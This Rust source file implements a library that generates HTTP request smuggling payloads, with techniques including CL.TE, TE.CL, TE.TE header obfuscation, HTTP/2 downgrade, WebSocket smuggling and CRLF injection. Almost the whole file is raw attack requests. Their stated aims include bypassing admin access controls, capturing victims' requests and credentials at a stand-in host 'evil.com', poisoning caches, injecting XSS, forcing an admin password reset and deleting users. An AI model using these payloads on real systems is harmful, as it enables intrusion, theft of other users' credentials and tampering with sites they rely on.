use std::fmt;

/// HTTP desynchronization attack technique classification.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum DesyncTechnique {
    /// CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding.
    ClTe,
    /// TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length.
    TeCl,
    /// TE.TE: Both use Transfer-Encoding, but obfuscation causes one to ignore it.
    TeTe,
    /// H2.CL: HTTP/2 front-end downgrades to HTTP/1.1 with Content-Length mismatch.
    H2Cl,
    /// H2.TE: HTTP/2 front-end downgrades to HTTP/1.1 with Transfer-Encoding injection.
    H2Te,
    /// Request tunneling: embed a complete request inside smuggled prefix.
    RequestTunneling,
    /// WebSocket smuggling: abuse Upgrade handshake to tunnel HTTP.
    WebSocketSmuggling,
    /// Hop-by-hop header abuse: strip headers between proxy hops.
    HopByHop,
    /// HTTP/2 CRLF injection via header values.
    H2CrlfInjection,
    /// Content-Length / Transfer-Encoding header duplication.
    HeaderDuplication,
}

impl fmt::Display for DesyncTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ClTe => write!(f, "CL.TE"),
            Self::TeCl => write!(f, "TE.CL"),
            Self::TeTe => write!(f, "TE.TE"),
            Self::H2Cl => write!(f, "H2.CL"),
            Self::H2Te => write!(f, "H2.TE"),
            Self::RequestTunneling => write!(f, "Request Tunneling"),
            Self::WebSocketSmuggling => write!(f, "WebSocket Smuggling"),
            Self::HopByHop => write!(f, "Hop-by-Hop Abuse"),
            Self::H2CrlfInjection => write!(f, "H2 CRLF Injection"),
            Self::HeaderDuplication => write!(f, "Header Duplication"),
        }
    }
}

/// Impact classification for desync payloads.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum DesyncImpact {
    /// Detection only: confirm desync exists.
    Detection,
    /// Poison web cache with arbitrary content.
    CachePoisoning,
    /// Steal other users' requests (credential capture).
    RequestCapture,
    /// Bypass front-end security controls (ACLs, WAF).
    SecurityBypass,
    /// Achieve reflected XSS via response splitting.
    ResponseSplitting,
    /// Full request hijacking: redirect victim to attacker endpoint.
    RequestHijacking,
}

impl fmt::Display for DesyncImpact {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Detection => write!(f, "Detection"),
            Self::CachePoisoning => write!(f, "Cache Poisoning"),
            Self::RequestCapture => write!(f, "Request Capture"),
            Self::SecurityBypass => write!(f, "Security Bypass"),
            Self::ResponseSplitting => write!(f, "Response Splitting"),
            Self::RequestHijacking => write!(f, "Request Hijacking"),
        }
    }
}

/// A generated HTTP desync payload.
#[derive(Debug, Clone)]
pub struct DesyncPayload {
    pub id: u32,
    pub technique: DesyncTechnique,
    pub impact: DesyncImpact,
    pub raw_request: String,
    pub description: String,
    pub transfer_encoding_variant: Option<String>,
    pub expected_behavior: String,
}

/// Transfer-Encoding obfuscation variants for TE.TE attacks.
fn te_obfuscation_variants() -> Vec<(&'static str, String)> {
    vec![
        ("standard", "Transfer-Encoding: chunked".into()),
        ("capitalized", "Transfer-Encoding: Chunked".into()),
        ("trailing_space", "Transfer-Encoding: chunked ".into()),
        ("tab_before_value", "Transfer-Encoding:\tchunked".into()),
        (
            "double_te",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity".into(),
        ),
        ("newline_prefix", "Transfer-Encoding:\n chunked".into()),
        ("x_prefix", "X-Transfer-Encoding: chunked".into()),
        ("null_byte", "Transfer-Encoding: chunked\0".into()),
        ("vertical_tab", "Transfer-Encoding: chunked\x0b".into()),
        ("mixed_case", "TrAnSfEr-EnCoDiNg: chunked".into()),
        ("trailing_comma", "Transfer-Encoding: chunked, cow".into()),
        ("semicolon", "Transfer-Encoding: chunked;".into()),
        ("cr_no_lf", "Transfer-Encoding: chunked\r".into()),
        ("space_in_name", "Transfer -Encoding: chunked".into()),
        ("colon_space_colon", "Transfer-Encoding:: chunked".into()),
    ]
}

/// HTTP desynchronization payload library.
#[derive(Debug)]
pub struct DesyncLibrary {
    target_host: String,
    smuggled_host: String,
}

impl Default for DesyncLibrary {
    fn default() -> Self {
        Self::new()
    }
}

impl DesyncLibrary {
    pub fn new() -> Self {
        Self {
            target_host: "vulnerable-app.com".to_string(),
            smuggled_host: "evil.com".to_string(),
        }
    }

    pub fn with_target_host(mut self, host: String) -> Self {
        self.target_host = host;
        self
    }

    pub fn with_smuggled_host(mut self, host: String) -> Self {
        self.smuggled_host = host;
        self
    }

    /// Generate all CL.TE desync payloads.
    pub fn cl_te_payloads(&self) -> Vec<DesyncPayload> {
        let mut payloads = Vec::new();
        let mut id = 100;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::ClTe,
            impact: DesyncImpact::Detection,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 6\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 G",
                self.target_host
            ),
            description: "CL.TE basic detection: front-end reads 6 bytes (CL), back-end processes chunked → 'G' poisons next request".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Next request gets 'GPOST' method → 405 or error".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::ClTe,
            impact: DesyncImpact::SecurityBypass,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 41\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 GET /admin HTTP/1.1\r\n\
                 Host: {}\r\n\
                 \r\n",
                self.target_host, self.target_host
            ),
            description: "CL.TE admin access bypass: smuggle GET /admin past front-end ACL".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Back-end processes smuggled GET /admin as separate request, bypassing front-end restrictions".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::ClTe,
            impact: DesyncImpact::RequestCapture,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 83\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 POST /capture HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 100000\r\n\
                 \r\n",
                self.target_host, self.smuggled_host
            ),
            description: "CL.TE request capture: smuggled POST with large CL consumes next victim's request as body".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Victim's next request appended to smuggled POST body → credentials captured at /capture".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::ClTe,
            impact: DesyncImpact::ResponseSplitting,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 150\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 GET /404 HTTP/1.1\r\n\
                 Host: {}\r\n\
                 \r\n\
                 HTTP/1.1 200 OK\r\n\
                 Content-Type: text/html\r\n\
                 Content-Length: 50\r\n\
                 \r\n\
                 <script>alert(document.domain)</script>",
                self.target_host, self.target_host
            ),
            description: "CL.TE response splitting: inject fake HTTP response with XSS payload"
                .into(),
            transfer_encoding_variant: None,
            expected_behavior:
                "Victim receives injected response with XSS instead of legitimate content".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::ClTe,
            impact: DesyncImpact::CachePoisoning,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 70\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 GET /static/main.js HTTP/1.1\r\n\
                 Host: {}\r\n\
                 X-Forwarded-Host: {}\r\n\
                 \r\n",
                self.target_host, self.target_host, self.smuggled_host
            ),
            description: "CL.TE cache poisoning: smuggle request that causes cache to store attacker-controlled response for /static/main.js".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Cache stores poisoned response for /static/main.js → served to all users".into(),
        });

        payloads
    }

    /// Generate all TE.CL desync payloads.
    pub fn te_cl_payloads(&self) -> Vec<DesyncPayload> {
        let mut payloads = Vec::new();
        let mut id = 200;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::TeCl,
            impact: DesyncImpact::Detection,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 4\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 2c\r\n\
                 GPOST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 \r\n\
                 0\r\n\
                 \r\n",
                self.target_host, self.target_host
            ),
            description: "TE.CL basic detection: front-end processes chunked, back-end reads 4 bytes → 'GPOST' on next".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Next request on connection prefixed with smuggled data".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::TeCl,
            impact: DesyncImpact::SecurityBypass,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 4\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 5e\r\n\
                 POST /admin HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Type: application/x-www-form-urlencoded\r\n\
                 Content-Length: 15\r\n\
                 \r\n\
                 x=1\r\n\
                 0\r\n\
                 \r\n",
                self.target_host, self.target_host
            ),
            description: "TE.CL admin bypass: chunked body contains full smuggled POST /admin"
                .into(),
            transfer_encoding_variant: None,
            expected_behavior:
                "Back-end reads 4 bytes of CL, rest becomes next request → /admin accessed".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::TeCl,
            impact: DesyncImpact::RequestCapture,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 4\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 8b\r\n\
                 POST /log HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Type: application/x-www-form-urlencoded\r\n\
                 Content-Length: 200000\r\n\
                 \r\n\
                 stolen=\r\n\
                 0\r\n\
                 \r\n",
                self.target_host, self.smuggled_host
            ),
            description: "TE.CL request capture: back-end sees smuggled POST with huge CL → consumes victim request".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Next user's request body captured in 'stolen' parameter".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::TeCl,
            impact: DesyncImpact::RequestHijacking,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 4\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 47\r\n\
                 GET / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 X-Forwarded-For: 127.0.0.1\r\n\
                 \r\n\
                 0\r\n\
                 \r\n",
                self.target_host, self.smuggled_host
            ),
            description: "TE.CL request hijacking: redirect next user's request to attacker host"
                .into(),
            transfer_encoding_variant: None,
            expected_behavior: "Victim's response comes from attacker-controlled host".into(),
        });

        payloads
    }

    /// Generate all TE.TE obfuscation variant payloads.
    pub fn te_te_payloads(&self) -> Vec<DesyncPayload> {
        let mut payloads = Vec::new();
        let mut id = 300;

        for (variant_name, te_header) in te_obfuscation_variants() {
            payloads.push(DesyncPayload {
                id,
                technique: DesyncTechnique::TeTe,
                impact: DesyncImpact::Detection,
                raw_request: format!(
                    "POST / HTTP/1.1\r\n\
                     Host: {}\r\n\
                     Content-Length: 4\r\n\
                     {te_header}\r\n\
                     \r\n\
                     1\r\n\
                     Z\r\n\
                     0\r\n\
                     \r\n",
                    self.target_host
                ),
                description: format!(
                    "TE.TE obfuscation ({variant_name}): one proxy honors TE, other falls back to CL"
                ),
                transfer_encoding_variant: Some(variant_name.to_string()),
                expected_behavior: "Desync if one proxy ignores obfuscated TE header".into(),
            });
            id += 1;
        }

        payloads
    }

    /// Generate HTTP/2 downgrade desync payloads (H2.CL and H2.TE).
    pub fn h2_downgrade_payloads(&self) -> Vec<DesyncPayload> {
        let mut payloads = Vec::new();
        let mut id = 400;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::H2Cl,
            impact: DesyncImpact::Detection,
            raw_request: format!(
                ":method POST\r\n\
                 :path /\r\n\
                 :authority {}\r\n\
                 content-length: 0\r\n\
                 \r\n\
                 GET /flag HTTP/1.1\r\n\
                 Host: {}\r\n\
                 \r\n",
                self.target_host, self.target_host
            ),
            description: "H2.CL detection: HTTP/2 request with CL:0 but body present. Front-end ignores body (H2 framing), back-end uses CL in downgraded HTTP/1.1".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Back-end sees extra data as next request after HTTP/2→1.1 downgrade".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::H2Cl,
            impact: DesyncImpact::SecurityBypass,
            raw_request: format!(
                ":method POST\r\n\
                 :path /\r\n\
                 :authority {}\r\n\
                 content-length: 0\r\n\
                 \r\n\
                 GET /admin HTTP/1.1\r\n\
                 Host: {}\r\n\
                 X-Internal: true\r\n\
                 \r\n",
                self.target_host, self.target_host
            ),
            description: "H2.CL admin bypass via HTTP/2 downgrade smuggling".into(),
            transfer_encoding_variant: None,
            expected_behavior:
                "Smuggled /admin request processed by back-end, bypassing H2 front-end ACL".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::H2Te,
            impact: DesyncImpact::Detection,
            raw_request: format!(
                ":method POST\r\n\
                 :path /\r\n\
                 :authority {}\r\n\
                 transfer-encoding: chunked\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 GET /smuggled HTTP/1.1\r\n\
                 Host: {}\r\n\
                 \r\n",
                self.target_host, self.target_host
            ),
            description: "H2.TE detection: HTTP/2 with TE:chunked header. Front-end strips TE (H2 spec violation), back-end processes it after downgrade".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Smuggled request processed after H2→1.1 downgrade".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::H2Te,
            impact: DesyncImpact::CachePoisoning,
            raw_request: format!(
                ":method POST\r\n\
                 :path /\r\n\
                 :authority {}\r\n\
                 transfer-encoding: chunked\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 GET /api/config HTTP/1.1\r\n\
                 Host: {}\r\n\
                 X-Forwarded-Host: {}\r\n\
                 \r\n",
                self.target_host, self.target_host, self.smuggled_host
            ),
            description: "H2.TE cache poisoning: smuggle request to poison /api/config cache entry"
                .into(),
            transfer_encoding_variant: None,
            expected_behavior: "Cache stores attacker-controlled response for /api/config".into(),
        });

        payloads
    }

    /// Generate request tunneling payloads (complete requests embedded in smuggled prefix).
    pub fn request_tunneling_payloads(&self) -> Vec<DesyncPayload> {
        let mut payloads = Vec::new();
        let mut id = 500;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::RequestTunneling,
            impact: DesyncImpact::SecurityBypass,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 56\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 GET /internal-api/users HTTP/1.1\r\n\
                 Host: {}\r\n\
                 \r\n",
                self.target_host, self.target_host
            ),
            description:
                "Request tunneling: access internal API endpoint through smuggled complete request"
                    .into(),
            transfer_encoding_variant: None,
            expected_behavior:
                "Back-end processes /internal-api/users as authenticated internal request".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::RequestTunneling,
            impact: DesyncImpact::SecurityBypass,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 110\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 POST /api/password-reset HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Type: application/json\r\n\
                 Content-Length: 30\r\n\
                 \r\n\
                 {{\"email\":\"admin@{}\"}}\r\n",
                self.target_host, self.target_host, self.target_host
            ),
            description: "Request tunneling: trigger password reset for admin via smuggled POST"
                .into(),
            transfer_encoding_variant: None,
            expected_behavior: "Password reset email sent to admin from back-end's perspective"
                .into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::RequestTunneling,
            impact: DesyncImpact::SecurityBypass,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 80\r\n\
                 Transfer-Encoding: chunked\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 DELETE /api/users/1 HTTP/1.1\r\n\
                 Host: {}\r\n\
                 X-Admin: true\r\n\
                 \r\n",
                self.target_host, self.target_host
            ),
            description:
                "Request tunneling: DELETE user via smuggled request with admin header injection"
                    .into(),
            transfer_encoding_variant: None,
            expected_behavior: "Back-end processes DELETE with X-Admin header → user deleted"
                .into(),
        });

        payloads
    }

    /// Generate WebSocket smuggling payloads.
    pub fn websocket_smuggling_payloads(&self) -> Vec<DesyncPayload> {
        let mut payloads = Vec::new();
        let mut id = 600;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::WebSocketSmuggling,
            impact: DesyncImpact::SecurityBypass,
            raw_request: format!(
                "GET /ws HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Upgrade: websocket\r\n\
                 Connection: Upgrade\r\n\
                 Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
                 Sec-WebSocket-Version: 13\r\n\
                 \r\n\
                 GET /admin HTTP/1.1\r\n\
                 Host: {}\r\n\
                 \r\n",
                self.target_host, self.target_host
            ),
            description: "WebSocket smuggling: front-end sees Upgrade, assumes WebSocket tunnel. Attacker sends raw HTTP through the 'WebSocket' connection to back-end".into(),
            transfer_encoding_variant: None,
            expected_behavior: "After fake WebSocket upgrade, raw HTTP flows to back-end bypassing all front-end controls".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::WebSocketSmuggling,
            impact: DesyncImpact::SecurityBypass,
            raw_request: format!(
                "GET /socket.io/?EIO=3&transport=websocket HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Upgrade: websocket\r\n\
                 Connection: Upgrade\r\n\
                 Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\n\
                 Sec-WebSocket-Version: 13\r\n\
                 Origin: https://{}\r\n\
                 \r\n",
                self.target_host, self.target_host
            ),
            description: "WebSocket smuggling via Socket.IO: abuse common WebSocket endpoint for tunnel establishment".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Socket.IO upgrade creates unfiltered tunnel to back-end".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::WebSocketSmuggling,
            impact: DesyncImpact::RequestHijacking,
            raw_request: format!(
                "GET / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Upgrade: websocket\r\n\
                 Connection: Upgrade\r\n\
                 Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==\r\n\
                 Sec-WebSocket-Version: 7\r\n\
                 \r\n",
                self.target_host
            ),
            description: "WebSocket version downgrade: request version 7 (old draft) to trigger different code paths".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Older WebSocket version may bypass validation in front-end proxy".into(),
        });

        payloads
    }

    /// Generate hop-by-hop header abuse payloads.
    pub fn hop_by_hop_payloads(&self) -> Vec<DesyncPayload> {
        let mut payloads = Vec::new();
        let mut id = 700;

        let abuse_headers = [
            ("X-Forwarded-For", "Strip source IP tracking"),
            ("X-Forwarded-Host", "Strip host verification"),
            ("X-Real-IP", "Strip client IP identification"),
            ("Authorization", "Strip auth header at proxy"),
            ("Cookie", "Strip session cookies at proxy"),
            ("X-Csrf-Token", "Strip CSRF protection"),
            ("Content-Length", "Strip CL to cause desync"),
            ("Transfer-Encoding", "Strip TE to cause desync"),
        ];

        for (header, purpose) in &abuse_headers {
            payloads.push(DesyncPayload {
                id,
                technique: DesyncTechnique::HopByHop,
                impact: DesyncImpact::SecurityBypass,
                raw_request: format!(
                    "GET / HTTP/1.1\r\n\
                     Host: {}\r\n\
                     Connection: close, {header}\r\n\
                     {header}: legitimate-value\r\n\
                     \r\n",
                    self.target_host
                ),
                description: format!(
                    "Hop-by-hop abuse: Connection header declares '{header}' as hop-by-hop → proxy strips it. {purpose}"
                ),
                transfer_encoding_variant: None,
                expected_behavior: format!("Proxy removes {header} before forwarding → back-end processes request without it"),
            });
            id += 1;
        }

        payloads
    }

    /// Generate HTTP/2 CRLF injection payloads.
    pub fn h2_crlf_injection_payloads(&self) -> Vec<DesyncPayload> {
        let mut payloads = Vec::new();
        let mut id = 800;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::H2CrlfInjection,
            impact: DesyncImpact::RequestHijacking,
            raw_request: format!(
                ":method GET\r\n\
                 :path /\r\n\
                 :authority {}\r\n\
                 x-inject: value\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: {}\\r\\n\\r\\n\r\n\
                 \r\n",
                self.target_host, self.target_host
            ),
            description: "H2 CRLF injection: embed CRLF in header value. After H2→H1 downgrade, injected headers/request appears in HTTP/1.1 stream".into(),
            transfer_encoding_variant: None,
            expected_behavior: "CRLF in header value creates new headers or request in downgraded H1 stream".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::H2CrlfInjection,
            impact: DesyncImpact::CachePoisoning,
            raw_request: format!(
                ":method GET\r\n\
                 :path /\r\n\
                 :authority {}\r\n\
                 x-inject: value\\r\\nX-Forwarded-Host: {}\\r\\n\r\n\
                 \r\n",
                self.target_host, self.smuggled_host
            ),
            description: "H2 CRLF header injection: inject X-Forwarded-Host for cache poisoning via H2→H1 downgrade".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Back-end sees injected X-Forwarded-Host → cache poisoned with attacker content".into(),
        });

        payloads
    }

    /// Generate Content-Length / Transfer-Encoding header duplication payloads.
    pub fn header_duplication_payloads(&self) -> Vec<DesyncPayload> {
        let mut payloads = Vec::new();
        let mut id = 900;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::HeaderDuplication,
            impact: DesyncImpact::Detection,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 6\r\n\
                 Content-Length: 0\r\n\
                 \r\n\
                 GPOST ",
                self.target_host
            ),
            description: "Duplicate Content-Length: front-end uses first (6), back-end uses last (0) or vice versa".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Desync between CL interpretation → 'GPOST' prefix on next request".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::HeaderDuplication,
            impact: DesyncImpact::Detection,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Length: 0\r\n\
                 Content-Length: 6\r\n\
                 \r\n\
                 GPOST ",
                self.target_host
            ),
            description: "Reverse duplicate Content-Length: test which CL value each component honors".into(),
            transfer_encoding_variant: None,
            expected_behavior: "Opposite desync direction — confirms which proxy uses first vs last CL".into(),
        });
        id += 1;

        payloads.push(DesyncPayload {
            id,
            technique: DesyncTechnique::HeaderDuplication,
            impact: DesyncImpact::Detection,
            raw_request: format!(
                "POST / HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Transfer-Encoding: chunked\r\n\
                 Transfer-Encoding: identity\r\n\
                 Content-Length: 6\r\n\
                 \r\n\
                 0\r\n\
                 \r\n\
                 X",
                self.target_host
            ),
            description: "Duplicate TE with CL fallback: 'chunked' vs 'identity' confusion plus CL"
                .into(),
            transfer_encoding_variant: Some("duplicate_te_identity".into()),
            expected_behavior:
                "Triple-header confusion: component choosing TE:identity falls back to CL".into(),
        });

        payloads
    }

    /// Generate the complete library of 50+ desync payloads.
    pub fn generate_full_library(&self) -> Vec<DesyncPayload> {
        let mut all = Vec::new();
        all.extend(self.cl_te_payloads());
        all.extend(self.te_cl_payloads());
        all.extend(self.te_te_payloads());
        all.extend(self.h2_downgrade_payloads());
        all.extend(self.request_tunneling_payloads());
        all.extend(self.websocket_smuggling_payloads());
        all.extend(self.hop_by_hop_payloads());
        all.extend(self.h2_crlf_injection_payloads());
        all.extend(self.header_duplication_payloads());
        all
    }

    /// Get payloads filtered by technique.
    pub fn payloads_by_technique(&self, technique: DesyncTechnique) -> Vec<DesyncPayload> {
        self.generate_full_library()
            .into_iter()
            .filter(|p| p.technique == technique)
            .collect()
    }

    /// Get payloads filtered by minimum impact level.
    pub fn payloads_by_min_impact(&self, min_impact: DesyncImpact) -> Vec<DesyncPayload> {
        self.generate_full_library()
            .into_iter()
            .filter(|p| p.impact >= min_impact)
            .collect()
    }
}
